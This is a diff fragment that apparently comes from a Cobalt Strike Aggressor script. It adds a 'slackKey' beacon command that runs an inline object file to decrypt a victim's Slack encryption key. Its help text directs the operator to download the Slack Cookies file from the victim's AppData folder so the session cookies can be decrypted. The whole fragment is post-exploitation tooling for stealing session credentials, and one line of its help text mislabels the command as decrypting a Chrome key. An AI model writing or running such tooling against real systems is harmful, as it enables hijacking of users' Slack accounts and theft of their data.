@@ -1571,6 +1571,24 @@ Usage:   chromeKey
 "  
 );
 
+#slackKey
+alias slackKey{
+    beacon_inline_execute($1, readbof($1, "slackKey"), "go", $null);
+}
+
+beacon_command_register(
+    "slackKey",
+    "Decrypts the provided base64 encoded Chrome key",
+    "
+Command: slackKey
+Summary: This command decrypts the provided base64 encoded Slack key for use 
+         in decrypting cookies. If you get results, download the Cookies file 
+         from slack.  An example Filepath is:
+  C:\\Users\\user\\AppData\\Roaming\\Slack\\Network\\Cookies
+
+Usage:   slackKey
+"  
+);
 
 
 sub bshspawnas {
